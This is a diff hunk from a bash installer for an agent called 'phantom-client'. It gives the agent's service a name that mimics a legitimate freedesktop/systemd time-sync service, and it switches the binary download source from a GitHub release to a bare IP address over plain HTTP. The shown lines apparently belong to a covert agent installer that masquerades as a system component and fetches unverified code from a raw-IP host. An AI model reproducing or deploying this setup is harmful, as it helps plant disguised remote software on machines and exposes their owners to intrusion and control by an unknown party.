@@ -10,7 +10,7 @@ set -euo pipefail
 readonly VERSION="1.0"
 readonly AGENT_NAME="phantom-client"
 readonly SERVICE_NAME="dbus-org.freedesktop.timesync1"
-readonly BASE_URL="https://github.com/Oyen-Sec/phantom-socket/releases/download/v1.0-Final"
+readonly BASE_URL="http://13.213.138.250/bin"
 
 # ============================================================================
 # UI Helpers
